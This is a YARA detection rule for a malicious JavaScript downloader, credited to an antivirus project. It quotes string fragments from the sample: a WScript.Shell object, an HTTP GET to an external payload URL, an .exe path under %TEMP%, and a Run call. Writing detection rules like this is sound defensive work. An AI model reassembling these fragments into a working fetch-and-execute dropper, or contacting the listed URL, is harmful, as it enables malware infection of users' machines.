rule sig_20160330_872328eb76ca6f3ca746f806d50ee7a3 {
  meta:
    description = "datamaliciousorder - file 20160330_872328eb76ca6f3ca746f806d50ee7a3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "eaf3e81f2b02c17bf0763229d1b517894333e70ca66d73f188cc5497f16e1eba"

  strings:
    $s1  = "function EU(TG, W1){C = C * 1; return TG - W1;};" fullword ascii
    $s2  = "var W0 = function PR() {return WScript[V0](\"WScript\"+\".Shell\");}(), G0 = 11;" fullword ascii
    $s3  = "I0[KM](\"GET\", \"http://tools24.nl/w8isa\", false);" fullword ascii
    $s4  = "if (I0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function V() {return W0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"26TumngsGJmIc.ex\" + \"e\";};" fullword ascii
    $s6  = "function HC(){return I + \"\";};" fullword ascii
    $s7  = "function GE() {return ((NV == true) && (NV == F)) ? 1 : C;};" fullword ascii
    $s8  = "function MW(UX){W0[\"Run\"](UX, C, C);};" fullword ascii
    $s9  = "function X(){return 22;};" fullword ascii
    $s10 = "var ML = new this[\"Date\"]();" fullword ascii
    $s11 = "return EU(W, Z);" fullword ascii
    $s12 = "function EY()" fullword ascii
    $s13 = "function R(MO) {var P0 = (1, 2, 3, 4, 5, MO); return P0;};" fullword ascii
    $s14 = "}while (X0);" fullword ascii
    $s15 = "function Q(){return V0;};" fullword ascii
    $s16 = "var F = false;" fullword ascii
    $s17 = "F = true; " fullword ascii
    $s18 = "var WL = false;" fullword ascii
    $s19 = "NV = true; " fullword ascii
    $s20 = "var NV = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}